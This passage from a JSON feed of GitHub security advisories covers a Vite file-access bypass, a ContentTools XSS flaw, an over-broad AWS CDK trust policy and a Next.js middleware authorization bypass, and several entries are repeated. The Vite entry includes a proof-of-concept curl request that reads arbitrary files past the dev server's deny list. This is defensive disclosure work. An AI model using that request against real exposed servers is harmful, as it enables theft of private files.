                "url": "https://github.com/advisories/GHSA-x574-m823-4x7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href=\"https://vitejs.dev/config/server-options.html#server-host\"><code>server.host</code> config option</a>) are affected.</p>\n<h3 id=\"details\">Details</h3>\n<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" &gt; /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    &lt;body&gt;\n      &lt;h1&gt;403 Restricted&lt;/h1&gt;\n      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w\">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30208\">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4\">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c\">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41\">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca\">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1\">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x574-m823-4x7w\">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x574-m823-4x7w",
            "title": "[vite] Vite bypasses server.fs.deny when using ?raw??",
            "date_modified": "2025-03-25T14:00:04.000Z",
            "date_published": "2025-03-25T14:00:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x574-m823-4x7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href=\"https://vitejs.dev/config/server-options.html#server-host\"><code>server.host</code> config option</a>) are affected.</p>\n<h3 id=\"details\">Details</h3>\n<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" &gt; /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    &lt;body&gt;\n      &lt;h1&gt;403 Restricted&lt;/h1&gt;\n      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w\">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30208\">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4\">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c\">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41\">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca\">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1\">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x574-m823-4x7w\">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x574-m823-4x7w",
            "title": "[vite] Vite bypasses server.fs.deny when using ?raw??",
            "date_modified": "2025-03-25T14:00:04.000Z",
            "date_published": "2025-03-25T14:00:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x574-m823-4x7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href=\"https://vitejs.dev/config/server-options.html#server-host\"><code>server.host</code> config option</a>) are affected.</p>\n<h3 id=\"details\">Details</h3>\n<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" &gt; /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    &lt;body&gt;\n      &lt;h1&gt;403 Restricted&lt;/h1&gt;\n      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w\">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30208\">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4\">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c\">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41\">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca\">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1\">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x574-m823-4x7w\">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x574-m823-4x7w",
            "title": "[vite] Vite bypasses server.fs.deny when using ?raw??",
            "date_modified": "2025-03-25T14:00:04.000Z",
            "date_published": "2025-03-25T14:00:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x574-m823-4x7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in GetmeUK ContentTools up to 1.6.16. It has been rated as problematic. Affected by this issue is some unknown functionality of the component Image Handler. The manipulation of the argument onload leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2699\">https://nvd.nist.gov/vuln/detail/CVE-2025-2699</a></li>\n<li><a href=\"https://gist.github.com/Masamuneee/657f2e2b0eb5bf9b0d4dbb79f00dac37\">https://gist.github.com/Masamuneee/657f2e2b0eb5bf9b0d4dbb79f00dac37</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.300716\">https://vuldb.com/?ctiid.300716</a></li>\n<li><a href=\"https://vuldb.com/?id.300716\">https://vuldb.com/?id.300716</a></li>\n<li><a href=\"https://vuldb.com/?submit.515864\">https://vuldb.com/?submit.515864</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4f2v-2gpq-qhjg\">https://github.com/advisories/GHSA-4f2v-2gpq-qhjg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4f2v-2gpq-qhjg",
            "title": "[ContentTools] GetmeUK ContentTools Cross-Site Scripting (XSS)",
            "date_modified": "2025-03-24T21:24:06.000Z",
            "date_published": "2025-03-24T09:34:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4f2v-2gpq-qhjg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://aws.amazon.com/cdk/\">AWS Cloud Development Kit (CDK)</a> is an open-source framework for defining cloud infrastructure using code. Users use it to create their own applications, which are converted to AWS CloudFormation templates during deployment to a user's AWS account. AWS CDK contains pre-built components called \"constructs,\" which are higher-level abstractions providing defaults and best practices. This approach enables developers to use familiar programming languages to define complex cloud infrastructure more efficiently than writing raw CloudFormation templates.</p>\n<p>The <a href=\"https://aws.amazon.com/codepipeline/\">AWS CodePipeline</a> construct deploys CodePipeline, a managed service that orchestrates software release processes through a series of stages, each comprising one or more actions executed by CodePipeline. To perform these actions, CodePipeline assumes IAM roles with permissions necessary for each step, allowing it to interact with AWS services and resources on behalf of the user.</p>\n<p>An issue exists where, when using CDK to create a CodePipeline with the CDK Construct Library, CDK creates an AWS Identity and Access Management (AWS IAM) trust policy with overly broad permissions. Any user with unrestricted sts:AssumeRole permissions could assume that trust policy. This issue does not affect users who supply their own role for CodePipeline.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>To leverage the issue, an actor has to be authenticated in the account and have an unrestricted sts:AssumeRole permission. The permissions an actor could leverage depend on the actions added to the pipeline. Possible permissions include actions on services such as CloudFormation, CodeCommit, Lambda, and ECS, as well as access to the S3 bucket holding pipeline build artifacts (<a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_codepipeline_actions-readme.html\">see documentation</a>). </p>\n<p>Users can review their AWS CloudTrail logs for when the role was assumed to determine if this was expected. </p>\n<h4 id=\"impacted-versions-v21840\">Impacted versions: &lt;v2.184.0</h4>\n<h3 id=\"patches\">Patches</h3>\n<p>The patches are included in the CDK Construct Library release <a href=\"https://github.com/aws/aws-cdk/releases/tag/v2.184.0\">v2.184.0</a>. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>\n<p>When new CDK applications using the latest version are initialized, they will use the new behavior with more restrictive permissions.</p>\n<p>Existing applications must upgrade to the latest version, change the <a href=\"https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/cx-api/FEATURE_FLAGS.md\">feature flag</a> (@aws-cdk/pipelines:reduceStageRoleTrustScope) to true and redeploy the application to apply this fix and use the new behavior with more restrictive permissions.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>You can explicitly supply the role for your <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_codepipeline-readme.html#cross-account-codepipelines\">CodePipeline</a> and follow the policy recommendations detailed in <a href=\"https://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-create-cross-account.html\">CodePipeline documentation</a>.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/aws/aws-cdk/issues/33709\">Original reporting issue.</a></p>\n<p>If you have any questions or comments about this advisory please contact AWS/Amazon Security via our <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">vulnerability reporting page</a> or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/aws-cdk/security/advisories/GHSA-5pq3-h73f-66hr\">https://github.com/aws/aws-cdk/security/advisories/GHSA-5pq3-h73f-66hr</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/issues/33709\">https://github.com/aws/aws-cdk/issues/33709</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/commit/a64b01cc2969822bb92d7bd72152ecb2ccf1c1cf\">https://github.com/aws/aws-cdk/commit/a64b01cc2969822bb92d7bd72152ecb2ccf1c1cf</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/releases/tag/v2.184.0\">https://github.com/aws/aws-cdk/releases/tag/v2.184.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5pq3-h73f-66hr\">https://github.com/advisories/GHSA-5pq3-h73f-66hr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5pq3-h73f-66hr",
            "title": "[aws-cdk-lib] AWS CDK CodePipeline: trusted entities are too broad",
            "date_modified": "2025-03-24T15:45:41.000Z",
            "date_published": "2025-03-24T15:45:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5pq3-h73f-66hr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js 13.x, this issue is fixed in <code>13.5.9</code></li>\n<li>For Next.js 12.x, this issue is fixed in <code>12.3.5</code></li>\n<li>For Next.js 11.x, consult the below workaround.</li>\n</ul>\n<p><em>Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability.</em></p>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v12.3.5\">https://github.com/vercel/next.js/releases/tag/v12.3.5</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v13.5.9\">https://github.com/vercel/next.js/releases/tag/v13.5.9</a></li>\n<li><a href=\"https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware\">https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/23/3\">http://www.openwall.com/lists/oss-security/2025/03/23/3</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/23/4\">http://www.openwall.com/lists/oss-security/2025/03/23/4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-24T14:40:23.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js 13.x, this issue is fixed in <code>13.5.9</code></li>\n<li>For Next.js 12.x, this issue is fixed in <code>12.3.5</code></li>\n<li>For Next.js 11.x, consult the below workaround.</li>\n</ul>\n<p><em>Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability.</em></p>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v12.3.5\">https://github.com/vercel/next.js/releases/tag/v12.3.5</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v13.5.9\">https://github.com/vercel/next.js/releases/tag/v13.5.9</a></li>\n<li><a href=\"https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware\">https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/23/3\">http://www.openwall.com/lists/oss-security/2025/03/23/3</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/23/4\">http://www.openwall.com/lists/oss-security/2025/03/23/4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-24T14:40:23.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js 13.x, this issue is fixed in <code>13.5.9</code></li>\n<li>For Next.js 12.x, this issue is fixed in <code>12.3.5</code></li>\n<li>For Next.js 11.x, consult the below workaround.</li>\n</ul>\n<p><em>Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability.</em></p>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v12.3.5\">https://github.com/vercel/next.js/releases/tag/v12.3.5</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v13.5.9\">https://github.com/vercel/next.js/releases/tag/v13.5.9</a></li>\n<li><a href=\"https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware\">https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/23/3\">http://www.openwall.com/lists/oss-security/2025/03/23/3</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/23/4\">http://www.openwall.com/lists/oss-security/2025/03/23/4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-24T14:40:23.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js 13.x, this issue is fixed in <code>13.5.9</code></li>\n<li>For Next.js 12.x, this issue is fixed in <code>12.3.5</code></li>\n<li>For Next.js 11.x, consult the below workaround.</li>\n</ul>\n<p><em>Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability.</em></p>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v12.3.5\">https://github.com/vercel/next.js/releases/tag/v12.3.5</a></li>\n<li><a href=\"https://github.com/vercel/next.js/releases/tag/v13.5.9\">https://github.com/vercel/next.js/releases/tag/v13.5.9</a></li>\n<li><a href=\"https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware\">https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/23/3\">http://www.openwall.com/lists/oss-security/2025/03/23/3</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/23/4\">http://www.openwall.com/lists/oss-security/2025/03/23/4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-24T14:40:23.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}